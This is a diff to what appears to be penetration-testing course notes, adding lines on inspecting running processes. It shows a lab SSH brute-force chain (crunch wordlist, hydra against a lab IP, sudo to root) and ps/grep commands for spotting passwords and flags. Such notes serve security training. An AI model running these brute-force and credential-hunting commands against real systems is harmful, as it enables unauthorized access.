@@ -2433,8 +2433,11 @@ Reference
     `crunch 6 6 -t Lab%%% > wordlist`  
     `hydra -l eve -P wordlist 192.168.185.214 -t 4 ssh -V` > Lab123  
     `ssh eve@192.168.185.214` `sudo -i` `whoami`  
-  - 
 - 18.2.2 Inspecting Service Footprints
+  - inspect the output of the ps command  
+    `watch -n 1 "ps -aux | grep pass"`  
+  - look at the list of running processes  
+    `ps aux | grep flag`  
 
 ## Penetration testing report 
 - note editor:
